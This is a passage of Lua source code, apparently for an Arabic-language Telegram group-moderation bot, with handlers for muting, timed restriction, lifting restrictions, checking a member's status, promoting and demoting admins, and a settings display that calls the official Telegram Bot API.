Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n 𖥔 عذرا لا تستطيع كتم ( "..Rutba(result.id_,msg.chat_id_).." )")
else
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم كتم لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_..'&until_date='..tonumber(msg.date_+Time))
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = TextEnd[4]}, start_function, nil)
return false
end
if text and text:match("^كتم (%d+)$") and Mod(msg) then
local userid = text:match("^كتم (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع كتم البوت ")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 𖥔 عذرا لا تستطيع كتم ( '..Rutba(userid,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' 𖥔 البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'Muted:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
return false
end
if text == ("الغاء كتم") and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Muted:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم الغاء كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^الغاء كتم @(.*)$") and Mod(msg) then
local username = text:match("^الغاء كتم @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Muted:User'..msg.chat_id_, result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم الغاء كتمه'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^الغاء كتم (%d+)$") and Mod(msg) then
local userid = text:match("^الغاء كتم (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Muted:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم الغاء كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم الغاء كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end

if text == ("تقيد") and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n ??  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع تقيد البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n 𖥔 عذرا لا تستطيع تقيد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تقيده'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^تقيد @(.*)$") and Mod(msg) then
local username = text:match("^تقيد @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع تقيد البوت ")
return false 
end
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," 𖥔 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n 𖥔 عذرا لا تستطيع تقيد ( '..Rutba(result.id_,msg.chat_id_)..' )')
return false 
end      
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
 
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم تقيده'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match('^تقيد (%d+) (.*)$') and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
local TextEnd = {string.match(text, "^(تقيد) (%d+) (.*)$")}
function start_function(extra, result, success)
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n 𖥔 عذرا لا تستطيع تقيد ( "..Rutba(result.sender_user_id_,msg.chat_id_).." )")
else
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تقيده لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end


if text and text:match('^تقيد (%d+) (.*) @(.*)$') and Mod(msg) then
local TextEnd = {string.match(text, "^(تقيد) (%d+) (.*) @(.*)$")}
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," 𖥔 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n 𖥔 عذرا لا تستطيع تقيد ( "..Rutba(result.id_,msg.chat_id_).." )")
else
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم تقيده لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_..'&until_date='..tonumber(msg.date_+Time))
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = TextEnd[4]}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^تقيد (%d+)$") and Mod(msg) then
local userid = text:match("^تقيد (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖥔 لا تسطيع تقيد البوت ")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n 𖥔 عذرا لا تستطيع تقيد ( '..Rutba(userid,msg.chat_id_)..' )')
else
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تقيده'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم تقيده'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
return false
end
------------------------------------------------------------------------
if text == ("الغاء تقيد") and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم الغاء تقيد'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^الغاء تقيد @(.*)$") and Mod(msg) then
local username = text:match("^الغاء تقيد @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم الغاء تقيد'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^الغاء تقيد (%d+)$") and Mod(msg) then
local userid = text:match("^الغاء تقيد (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم الغاء تقيد'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم الغاء تقيد'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text and text:match('^رفع القيود @(.*)') and Manager(msg) then 
local username = text:match('^رفع القيود @(.*)') 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if Devban(msg) then
database:srem(bot_id..'GVNO:User',result.id_)
database:srem(bot_id..'VNO:User'..msg.chat_id_,result.id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.id_)
database:srem(bot_id..'Gmute:User'..msg.chat_id_,result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم الغاء جميع القيود'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
else
database:srem(bot_id..'VNO:User'..msg.chat_id_,result.id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم الغاء جميع القيود'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
end
else
Text = ' 𖥔 المعرف غلط'
send(msg.chat_id_, msg.id_,Text)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
if text == "رفع القيود" and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if Devban(msg) then
database:srem(bot_id..'GVNO:User',result.sender_user_id_)
database:srem(bot_id..'VNO:User'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم الغاء جميع القيود'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
else
database:srem(bot_id..'VNO:User'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم الغاء جميع القيود'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match('^كشف القيود @(.*)') and Manager(msg) then 
local username = text:match('^كشف القيود @(.*)') 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if database:sismember(bot_id..'Muted:User'..msg.chat_id_,result.id_) then
Muted = 'مكتوم'
else
Muted = 'غير مكتوم'
end
if database:sismember(bot_id..'VNO:User'..msg.chat_id_,result.id_) then
VNO = 'محظور'
else
VNO = 'غير محظور'
end
if database:sismember(bot_id..'GVNO:User',result.id_) then
GVNO = 'محظور عام'
else
GVNO = 'غير محظور عام'
end
Textt = " 𖥔 الحظر العام  ↚ "..GVNO.."\n 𖥔 الحظر  ↚ "..VNO.."\n 𖥔 الكتم  ↚ "..Muted..""
send(msg.chat_id_, msg.id_,Textt)
else
Text = ' 𖥔 المعرف غلط'
send(msg.chat_id_, msg.id_,Text)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end

if text == "كشف القيود" and Manager(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if database:sismember(bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_) then
Muted = 'مكتوم'
else
Muted = 'غير مكتوم'
end
if database:sismember(bot_id..'VNO:User'..msg.chat_id_,result.sender_user_id_) then
VNO = 'محظور'
else
VNO = 'غير محظور'
end
if database:sismember(bot_id..'GVNO:User',result.sender_user_id_) then
GVNO = 'محظور عام'
else
GVNO = 'غير محظور عام'
end
if database:sismember(bot_id..'Gmute:User',result.sender_user_id_) then
Gmute = 'محظور عام'
else
Gmute = 'غير محظور عام'
end
Textt = " 𖥔 الحظر العام  ↚ "..GVNO.."\n 𖥔 الكتم العام  ↚ "..Gmute.."\n 𖥔 الحظر  ↚ "..VNO.."\n 𖥔 الكتم  ↚ "..Muted..""
send(msg.chat_id_, msg.id_,Textt)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text == ("رفع مشرف") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
function start_function(extra, result, success)
https.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_invite_users=True")
local Text = "𖥔 تم ترقيته مشرف"
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'تعديل الصلاحيات', callback_data='amr@'..msg.sender_user_id_..'/user@'..result.sender_user_id_.."/setiinginfo"}
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع مشرف @(.*)$") and Constructor(msg) then
local username = text:match("^رفع مشرف @(.*)$")
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"𖥔 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end
https.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_invite_users=True")
local Text = "𖥔 تم ترقيته مشرف"
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'تعديل الصلاحيات', callback_data='amr@'..msg.sender_user_id_..'/user@'..result.id_.."/setiinginfo"}
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,"𖥔 لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text == ("تنزيل مشرف") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' 𖥔 البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔  الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔  الايدي  ↚ `'..result.sender_user_id_..'`\n 𖥔  تم تنزيله ادمن من الجروب'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل مشرف @(.*)$") and Constructor(msg) then
local username = text:match("^تنزيل مشرف @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' 𖥔 البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," 𖥔  عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
usertext = '\n 𖥔  الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔  تم تنزيله ادمن من الجروب'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '⚠¦ لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end



----------------------------------------- انتهاء كشف المجموعة
if text == 'الاعدادات' and Mod(msg) then    
if database:get(bot_id..'lockpin'..msg.chat_id_) then    
lock_pin = '✓'
else 
lock_pin = '✘'    
end
if database:get(bot_id..'lock:tagservr'..msg.chat_id_) then    
lock_tagservr = '✓'
else 
lock_tagservr = '✘'    
end
if database:get(bot_id..'lock:text'..msg.chat_id_) then    
lock_text = '✓'
else 
lock_text = '✘'    
end
if database:get(bot_id.."lock:AddMempar"..msg.chat_id_) == 'kick' then
lock_add = '✓'
else 
lock_add = '✘'    
end    
if database:get(bot_id.."lock:Join"..msg.chat_id_) == 'kick' then
lock_join = '✓'
else 
lock_join = '✘'    
end    
if database:get(bot_id..'lock:edit'..msg.chat_id_) then    
lock_edit = '✓'
else 
lock_edit = '✘'    
end
print(welcome)
if database:get(bot_id..'Get:Welcome:Group'..msg.chat_id_) then
welcome = '✓'
else 
welcome = '✘'    
end
if database:get(bot_id..'lock:edit'..msg.chat_id_) then    
lock_edit_med = '✓'
else 
lock_edit_med = '✘'    
end
if database:hget(bot_id.."flooding:settings:"..msg.chat_id_, "flood") == "kick" then     
flood = 'بالطرد'     
elseif database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "keed" then     
flood = 'بالتقيد'     
elseif database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "mute" then     
flood = 'بالكتم'           
elseif database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "del" then     
flood = 'بالمسح'           
else     
flood = '✘'     
end
if database:get(bot_id.."lock:Photo"..msg.chat_id_) == "del" then
lock_photo = '✓' 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ked" then 
lock_photo = 'بالتقيد'   
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ktm" then 
lock_photo = 'بالكتم'    
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "kick" then 
lock_photo = 'بالطرد'   
else
lock_photo = '✘'   
end    
if database:get(bot_id.."lock:Contact"..msg.chat_id_) == "del" then
lock_phon = '✓' 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ked" then 
lock_phon = 'بالتقيد'    
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ktm" then 
lock_phon = 'بالكتم'    
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "kick" then 
lock_phon = 'بالطرد'    
else
lock_phon = '✘'    
end    
if database:get(bot_id.."lock:Link"..msg.chat_id_) == "del" then
lock_links = '✓'
